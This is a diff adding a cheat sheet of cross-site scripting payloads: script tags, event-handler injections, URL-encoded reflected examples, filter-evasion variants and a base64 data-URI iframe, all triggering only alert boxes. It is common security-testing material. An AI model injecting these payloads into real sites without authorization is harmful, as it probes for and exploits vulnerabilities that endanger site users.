@@ -1,0 +1,66 @@
+
+--- Cross-Site Scripting (XSS) payload examples ---
+
+🔸 Basic XSS Payloads
+
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+
+
+🔸 Event Handler Injections
+
+<a href="#" onclick="alert('XSS')">Click</a>
+<body onload=alert('XSS')>
+<div onmouseover="alert('XSS')">Hover me</div>
+
+
+🔸 URL-Based Reflected XSS
+
+http://example.com/?q=<script>alert(1)</script>
+http://example.com/?search=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+
+🔸 Obfuscated or Encoded Variants
+
+<scr<script>ipt>alert(1)</script>
+<SCRIPT/XSS>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG SRC=JaVaScRiPt:alert(1)>
+
+
+🔸 Data URI Based
+
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+
+
+🔸 HTML Injection (if <script> is blocked)
+
+<h1>Hacked</h1>
+<b onmouseover=alert(1)>hover</b>
+<details open ontoggle=alert(1)>click me</details>
+
+
+
+https://github.com/payloadbox/xss-payload-list
+https://www.w3schools.com/tags/ref_urlencode.ASP
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
